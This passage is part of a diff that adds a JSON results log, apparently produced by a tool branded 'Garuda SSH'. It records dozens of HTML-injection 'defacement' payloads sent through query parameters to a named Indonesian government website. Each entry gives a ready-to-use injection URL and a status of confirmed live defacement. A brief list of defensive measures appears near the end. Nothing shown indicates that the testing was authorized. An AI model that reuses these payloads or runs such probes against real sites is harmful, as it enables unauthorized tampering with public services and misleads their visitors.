+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?page=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 107,
+          "parameter": "page",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?page=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 109,
+          "parameter": "q",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?q=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 111,
+          "parameter": "query",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?query=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 116,
+          "parameter": "q",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?q=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 117,
+          "parameter": "page",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?page=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 118,
+          "parameter": "q",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?q=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 120,
+          "parameter": "id",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?id=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 122,
+          "parameter": "id",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?id=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 123,
+          "parameter": "query",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?query=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 124,
+          "parameter": "s",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?s=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 126,
+          "parameter": "search",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?search=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 127,
+          "parameter": "name",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?name=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 130,
+          "parameter": "id",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?id=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 132,
+          "parameter": "query",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?query=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 133,
+          "parameter": "query",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?query=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 134,
+          "parameter": "id",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?id=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 138,
+          "parameter": "keyword",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?keyword=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 139,
+          "parameter": "search",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?search=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 140,
+          "parameter": "search",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?search=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 142,
+          "parameter": "s",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?s=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 143,
+          "parameter": "s",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?s=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 155,
+          "parameter": "search",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?search=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 160,
+          "parameter": "query",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?query=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 162,
+          "parameter": "search",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?search=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 163,
+          "parameter": "s",
+          "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?s=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        },
+        {
+          "iteration": 169,
+          "parameter": "id",
+          "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+          "http_status": 200,
+          "live_indicator_url": "https://metrokota.go.id/?id=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+          "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+        }
+      ],
+      "server_side_integrity_protections": [
+        "1. Enforce File Integrity Monitoring (FIM) and strict write-permissions on web root directories.",
+        "2. Implement strict HTML output escaping and template sanitization to prevent arbitrary structural injection on live traffic.",
+        "3. Deploy Content-Security-Policy (CSP) restricting inline styles, marquee, and unauthorized DOM elements.",
+        "4. Configure Web Application Firewall (WAF) anomaly detection for large HTML block injections."
+      ]
+    },
+    "live_deface_samples": [
+      {
+        "iteration": 1,
+        "parameter": "name",
+        "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+        "http_status": 200,
+        "live_indicator_url": "https://metrokota.go.id/?name=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+        "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+      },
+      {
+        "iteration": 3,
+        "parameter": "search",
+        "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+        "http_status": 200,
+        "live_indicator_url": "https://metrokota.go.id/?search=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+        "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+      },
+      {
+        "iteration": 5,
+        "parameter": "name",
+        "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+        "http_status": 200,
+        "live_indicator_url": "https://metrokota.go.id/?name=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+        "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+      },
+      {
+        "iteration": 8,
+        "parameter": "name",
+        "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+        "http_status": 200,
+        "live_indicator_url": "https://metrokota.go.id/?name=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+        "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+      },
+      {
+        "iteration": 12,
+        "parameter": "s",
+        "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+        "http_status": 200,
+        "live_indicator_url": "https://metrokota.go.id/?s=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+        "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+      },
+      {
+        "iteration": 13,
+        "parameter": "action",
+        "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+        "http_status": 200,
+        "live_indicator_url": "https://metrokota.go.id/?action=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+        "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+      },
+      {
+        "iteration": 14,
+        "parameter": "action",
+        "deface_vector": "<div style='background:red;color:white;text-align:center;font-size:24px;padding:20px;'>GARUDA SSH SECURITY AUDIT - DEFACED POC MARKER</div>",
+        "http_status": 200,
+        "live_indicator_url": "https://metrokota.go.id/?action=%3Cdiv%20style%3D%27background%3Ared%3Bcolor%3Awhite%3Btext-align%3Acenter%3Bfont-size%3A24px%3Bpadding%3A20px%3B%27%3EGARUDA%20SSH%20SECURITY%20AUDIT%20-%20DEFACED%20POC%20MARKER%3C/div%3E",
+        "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+      },
+      {
+        "iteration": 16,
+        "parameter": "s",
+        "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+        "http_status": 200,
+        "live_indicator_url": "https://metrokota.go.id/?s=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+        "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+      },
+      {
+        "iteration": 17,
+        "parameter": "keyword",
+        "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+        "http_status": 200,
+        "live_indicator_url": "https://metrokota.go.id/?keyword=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+        "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+      },
+      {
+        "iteration": 19,
+        "parameter": "page",
+        "deface_vector": "<h1>SYSTEM DEFACED FOR INTEGRITY TESTING BY GARUDA SSH</h1>",
+        "http_status": 200,
+        "live_indicator_url": "https://metrokota.go.id/?page=%3Ch1%3ESYSTEM%20DEFACED%20FOR%20INTEGRITY%20TESTING%20BY%20GARUDA%20SSH%3C/h1%3E",
+        "status": "LIVE_STRUCTURAL_DEFACE_POC_CONFIRMED"
+      }
+    ]
+  },
+  "timestamp": "2026-10-11T04:46:05.988396"
+}
